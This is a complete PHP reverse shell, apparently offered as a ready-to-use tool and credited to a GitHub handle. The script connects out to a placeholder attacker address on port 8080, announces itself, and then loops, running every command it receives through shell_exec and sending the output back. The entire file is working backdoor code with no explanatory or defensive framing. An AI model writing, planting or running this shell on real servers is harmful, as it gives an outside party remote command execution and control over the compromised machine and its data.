<?php
$sock = fsockopen("Destination IP", 8080);
if ($sock) {
    fwrite($sock, "github.com/9dl\n");
    fwrite($sock, "Connected!\n");
    while (!feof($sock)) {
        $cmd = trim(fgets($sock));
        if ($cmd === 'exit') break;
        $output = shell_exec($cmd . " 2>&1");
        fwrite($sock, $output);
    }
    fclose($sock);
}
?>